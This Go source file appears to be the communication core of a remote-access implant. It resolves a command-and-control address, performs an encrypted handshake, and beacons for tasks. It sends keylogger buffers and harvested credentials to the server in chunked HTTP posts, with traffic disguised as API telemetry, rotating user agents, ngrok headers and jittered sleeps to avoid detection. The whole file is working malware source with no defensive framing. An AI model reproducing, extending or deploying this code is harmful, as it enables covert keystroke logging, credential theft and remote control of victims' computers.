package main

import (
	"bytes"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"golang.org/x/crypto/hkdf"
)

func resolveC2() string {
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}
	resp, err := client.Get(RESOLVER_URL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(body))
}

// endpoint builds the full URL for a logical message type from the profile.
func endpoint(kind string) string {
	p := PROFILE.Paths[kind]
	if p == "" {
		switch kind {
		case "handshake":
			p = "/api/v1/auth"
		case "beacon":
			p = "/api/v1/sync"
		case "result":
			p = "/api/v1/telemetry"
		default:
			p = "/"
		}
	}
	return C2_ADDRESS + p
}

// profileHeaders sets a random User-Agent (from the profile pool) plus the
// static profile headers on the request.
func profileHeaders(req *http.Request) {
	ua := "Mozilla/5.0"
	if len(PROFILE.UserAgents) > 0 {
		n, err := rand.Int(rand.Reader, big.NewInt(int64(len(PROFILE.UserAgents))))
		if err == nil {
			ua = PROFILE.UserAgents[n.Int64()]
		}
	}
	req.Header.Set("User-Agent", ua)
	for k, v := range PROFILE.Headers {
		req.Header.Set(k, v)
	}
}

func performHandshake() {
	if C2_ADDRESS == "" {
		C2_ADDRESS = resolveC2()
		if C2_ADDRESS == "" {
			return
		}
	}

	curve := ecdh.P256()
	privKey, err := curve.GenerateKey(rand.Reader)
	if err != nil {
		queueError("handshake_keygen")
		return
	}
	pubKey := privKey.PublicKey()

	packet := Task{
		Type:      "handshake",
		PublicKey: base64.StdEncoding.EncodeToString(pubKey.Bytes()),
	}
	jsonPacket, err := json.Marshal(packet)
	if err != nil {
		queueError("handshake_marshal")
		return
	}

	encryptedPacket, err := EncryptStatic(string(jsonPacket))
	if err != nil {
		queueError("handshake_encrypt")
		return
	}

	client := &http.Client{Timeout: 10 * time.Second, Transport: C2_TRANSPORT}
	req, err := http.NewRequest("POST", endpoint("handshake"), bytes.NewBuffer([]byte(encryptedPacket)))
	if err != nil {
		queueError("handshake_req")
		return
	}
	profileHeaders(req)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)

	resp, err := client.Do(req)
	if err != nil {
		queueError("handshake_conn")
		return
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		queueError("handshake_read")
		return
	}
	decryptedResp, err := DecryptStatic(string(bodyBytes))
	if err != nil {
		queueError("handshake_decrypt")
		return
	}

	var handshakeResp HandshakeResponse
	json.Unmarshal([]byte(decryptedResp), &handshakeResp)

	serverPubBytes, err := base64.StdEncoding.DecodeString(handshakeResp.PublicKey)
	if err != nil {
		queueError("handshake_pubkey")
		return
	}
	serverPub, err := curve.NewPublicKey(serverPubBytes)
	if err != nil {
		queueError("handshake_pubkey")
		return
	}

	sharedSecret, err := privKey.ECDH(serverPub)
	if err != nil {
		queueError("handshake_ecdh")
		return
	}

	hkdfReader := hkdf.New(sha256.New, sharedSecret, nil, []byte("handshake data"))
	derivedKey := make([]byte, 32)
	if _, err := io.ReadFull(hkdfReader, derivedKey); err != nil {
		queueError("handshake_hkdf")
		return
	}

	SESSION_KEY = derivedKey
}

func beacon() {
	if C2_ADDRESS == "" {
		C2_ADDRESS = resolveC2()
		if C2_ADDRESS == "" {
			return
		}
	}
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}

	req, err := http.NewRequest("GET", endpoint("beacon"), nil)
	if err != nil {
		C2_ADDRESS = ""
		return
	}
	profileHeaders(req)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Conn Error")
		C2_ADDRESS = ""
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			queueError("beacon_read")
			return
		}
		encryptedTask := string(bodyBytes)
		decryptedJson, err := Decrypt(encryptedTask)
		if err != nil {
			queueError("beacon_decrypt")
			return
		}

		var task Task
		json.Unmarshal([]byte(decryptedJson), &task)

		KEYLOG_MUTEX.Lock()
		var keylogs string
		if KEYLOG_BUFFER.Len() > 0 {
			keylogs = KEYLOG_BUFFER.String()
			KEYLOG_BUFFER.Reset()
		}
		KEYLOG_MUTEX.Unlock()

		if task.Type == "harvest" {
			harvestCredentials()
			if keylogs != "" {
				res := Result{Type: "keylog", Data: keylogs}
				res = attachErrors(res)
				jsonResult, err := json.Marshal(res)
				if err == nil {
					encryptedResult, err := Encrypt(string(jsonResult))
					if err == nil {
						postResult(encryptedResult)
					}
				}
			}
		} else {
			result := handleTask(task)
			if keylogs != "" {
				result.Keylogs = keylogs
			}
			result = attachErrors(result)
			jsonResult, err := json.Marshal(result)
			if err != nil {
				queueError("beacon_marshal")
				return
			}
			encryptedResult, err := Encrypt(string(jsonResult))
			if err != nil {
				queueError("beacon_encrypt")
				return
			}
			postResult(encryptedResult)
		}

		if task.Type == "uninstall" {
			releaseMutex()
			os.Exit(0)
		}
	} else if resp.StatusCode == 204 {
		fmt.Print(".")
	}
}

func sendErrorLog(msg string) {
	result := Result{Type: "text", Data: msg}
	result = attachErrors(result)
	jsonResult, err := json.Marshal(result)
	if err != nil {
		queueError("sendlog_marshal")
		return
	}
	encryptedResult, err := Encrypt(string(jsonResult))
	if err != nil {
		queueError("sendlog_encrypt")
		return
	}
	postResult(encryptedResult)
}

func postResult(encryptedData string) {
	client := &http.Client{Timeout: 30 * time.Second, Transport: C2_TRANSPORT}
	maxBytes := PROFILE.MaxBodyKB * 1024
	if maxBytes <= 0 {
		maxBytes = 256 * 1024
	}

	if len(encryptedData) <= maxBytes {
		postChunk(client, encryptedData, 0, 1)
		return
	}

	total := (len(encryptedData) + maxBytes - 1) / maxBytes
	for i := 0; i < len(encryptedData); i += maxBytes {
		end := i + maxBytes
		if end > len(encryptedData) {
			end = len(encryptedData)
		}
		postChunk(client, encryptedData[i:end], i/maxBytes, total)
	}
}

func postChunk(client *http.Client, chunk string, idx, total int) {
	req, err := http.NewRequest("POST", endpoint("result"), bytes.NewBufferString(chunk))
	if err != nil {
		queueError("post_req")
		return
	}
	profileHeaders(req)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", AGENT_ID)
	if total > 1 {
		req.Header.Set("X-Chunk-Index", strconv.Itoa(idx))
		req.Header.Set("X-Chunk-Total", strconv.Itoa(total))
	}
	client.Do(req)
}

func sleepWithJitter() {
	min := PROFILE.Sleep.MinSeconds
	max := PROFILE.Sleep.MaxSeconds
	if max < min {
		max = min
	}
	span := max - min

	secs := min
	if span > 0 {
		n, err := rand.Int(rand.Reader, big.NewInt(int64(span)+1))
		if err == nil {
			secs = min + int(n.Int64())
		}
	}
	m, _ := rand.Int(rand.Reader, big.NewInt(1000))
	drift := time.Duration(m.Int64()) * time.Millisecond
	time.Sleep(time.Duration(secs)*time.Second + drift)
}
